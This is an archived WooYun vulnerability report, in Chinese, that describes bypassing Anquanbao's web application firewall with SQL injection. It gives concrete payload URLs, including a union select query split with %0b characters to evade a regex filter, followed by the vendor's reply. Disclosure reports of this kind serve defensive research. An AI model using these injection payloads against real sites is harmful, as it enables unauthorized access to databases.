@@ -1,0 +1,256 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		安全宝sql注入可被绕过  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		安全宝sql注入可被绕过  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/在路上">在路上</a> 
+</li><li>提交时间：		2013-05-23 01:04</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-05-23：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-05-27：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-06-06：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-06-16：	细节向普通白帽子公开<br/>
+									2013-06-26：	细节向实习白帽子公开<br/>
+									2013-07-07：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">安全宝的sql注入可被绕过</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">今天一个朋友给我发一个连接，http://secaqb.anquanbao.org/sqlin.php?id=9 问我有没有注入，闲着无聊就试试，<br />
+<br />
+<br />
+<br />
+http://secaqb.anquanbao.org/sqlin.php?id=9&#039;<br />
+<br />
+</p><p class="detail"><a href="../images/22213109ff90972c15f1ae24e03b4aece2323ade.jpg" target="_blank"><img src="../images/22213109ff90972c15f1ae24e03b4aece2323ade.jpg" alt="1.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+简单看一下，额这是什么东西 没有见过呀，朋友说是waf,好高端的样子，百度waf<br />
+<br />
+http://zhidao.baidu.com/question/437176497.html 原来这个是waf,那就是说web前面多了牛叉的东西防止注入了吧。继续搞不信这么安全。<br />
+<br />
+<br />
+<br />
+php的 应该是mysql吧，试试<br />
+<br />
+http://secaqb.anquanbao.org/sqlin.php?id=9 or 1=1<br />
+<br />
+额 还不行 又出来拦截了。<br />
+<br />
+<br />
+<br />
+http://secaqb.anquanbao.org/sqlin.php?id=9 or 1&gt;1<br />
+<br />
+额 考虑的挺全呀，这个也考虑了呀<br />
+<br />
+<br />
+<br />
+http://secaqb.anquanbao.org/sqlin.php?id=9 or(1)in(1)<br />
+<br />
+额 这个不拦了 结果是正确的<br />
+<br />
+</p><p class="detail"><a href="../images/222131307ecb39963cd7d20dc1be36f617af850c.jpg" target="_blank"><img src="../images/222131307ecb39963cd7d20dc1be36f617af850c.jpg" alt="2.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+http://secaqb.anquanbao.org/sqlin.php?id=-9%20or(-1)in(1)<br />
+<br />
+在试一下这个<br />
+<br />
+</p><p class="detail"><a href="../images/2221322994904e9845e36b0cbc225d8fec603f51.jpg" target="_blank"><img src="../images/2221322994904e9845e36b0cbc225d8fec603f51.jpg" alt="3.jpg" width="600"/></a></p><p class="detail">没有结果确实是一个注入点。<br />
+<br />
+<br />
+<br />
+给朋友反馈说是注入，没想到这家伙贪得无厌，还让我查数据，说这个不过瘾。<br />
+<br />
+<br />
+<br />
+那就继续吧，union select才能查询数据吧 那就试试。<br />
+<br />
+<br />
+<br />
+http://secaqb.anquanbao.org/sqlin.php?id=-9%20union<br />
+<br />
+不拦 可以用union <br />
+<br />
+<br />
+<br />
+http://secaqb.anquanbao.org/sqlin.php?id=-9%20union%20select<br />
+<br />
+大喜 这个也不拦<br />
+<br />
+<br />
+<br />
+悲剧刚刚开始，在select后面添加字符就拦了 不知道怎么搞了，想来想去，这是怎么回事呢<br />
+<br />
+朋友说，这个是因为它使用正则进行匹配了，遇到union select就可能给拦截了 正则大概就是<br />
+<br />
+union\sselect,正则就是希望呀，正则是精确匹配，稍微有点不同就完蛋了。哈哈，上特殊字符直接就绕过正则了，经测试终于搞定了，构造语句如下:<br />
+<br />
+http://secaqb.anquanbao.org/sqlin.php?id=-9%20union%0bselect%0b1,user(),version(),database()<br />
+<br />
+</p><p class="detail"><a href="../images/222132561cc7f7688f3999d60afbf14fe60f8e3d.jpg" target="_blank"><img src="../images/222132561cc7f7688f3999d60afbf14fe60f8e3d.jpg" alt="4.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+就这样了没有什么意思，发给朋友交差了。<br />
+<br />
+<br />
+<br />
+后话:后来得知这个是安全宝的防护设备，因此上来偏点rank 想弄本书，希望能得逞。<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/222133376cdaed46406c31d0056b7da6c885f133.jpg" target="_blank"><img src="../images/222133376cdaed46406c31d0056b7da6c885f133.jpg" alt="4.jpg" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">修复这个我也不是很懂<br />
+<br />
+<br />
+<br />
+但是其实搞一个通用防护还是挺不容易的，有点疏忽也是正常的<br />
+<br />
+<br />
+<br />
+哈哈，都这么说了不知道有没有rank。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/在路上" title="在路上">在路上</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-024307" title="安全宝sql注入可被绕过">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：低</p>
+						<p class="detail">漏洞Rank：2 </p>
+													<p class="detail">确认时间：2013-05-27 12:04</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">您好，这个问题在{安全宝waf绕过反馈得大礼}活动中已经被反馈过，正在修复中，非常感谢您对安全宝的支持，waf绕过需要反馈到security@anquanbao.com 这个邮箱才能参加这个活动，也欢迎更多的白帽子向我们反馈安全问题</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="24307";
+var bugRating="-2";
+var myRating="";
+var ratingCount="3";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
